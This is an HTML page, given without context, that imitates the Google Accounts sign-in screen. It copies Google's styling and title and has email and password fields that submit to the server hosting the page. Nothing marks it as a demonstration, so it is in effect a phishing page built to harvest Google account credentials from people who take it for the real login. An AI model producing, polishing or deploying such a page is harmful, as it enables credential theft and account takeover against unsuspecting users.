<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 450px;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .logo {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        p {
            font-size: 16px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }

        .footer {
            margin-top: 40px;
            text-align: left;
            font-size: 14px;
            color: #70757a;
        }
    </style>
</head>

<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 75 24" alt="Google">
            <path
                d="M4.0 6.6l.8 1.4c-.6.3-1.0.6-1.4.9l-.7-1.4c.4-.3.9-.6 1.3-.9zm.2 1.4c.5-.3.9-.6 1.4-.8l.7 1.3c-.5.3-.9.6-1.4.9l-.7-1.4zm-.2 2.6c.4-.2.8-.4 1.2-.6l.7 1.4c-.4.2-.8.4-1.2.6l-.7-1.4zm0 2.5c.4-.2.8-.3 1.2-.5l.7 1.4c-.4.2-.8.4-1.2.6l-.7-1.5zm.1 2.5l1.0-.4.7 1.5-1.0.4-.7-1.5zm.9 3.0l.9-.3.6 1.4-.9.3-.6-1.4zm2.8 1.9l.8-.4.7 1.5-.7.4-.8-1.5zm2.8.9l.7-.2.6 1.4-.6.2-.7-1.4zm2.9.2l.6-.1.6 1.4-.5.1-.7-1.4z"
                fill="#EA4335" />
        </svg>
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/" method="POST">
            <input type="text" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <div style="text-align: left; color: #1a73e8; font-weight: 500; margin-bottom: 25px; cursor: pointer;">
                Forgot password?</div>
            <button type="submit" class="btn">Next</button>
        </form>
    </div>
</body>

</html>
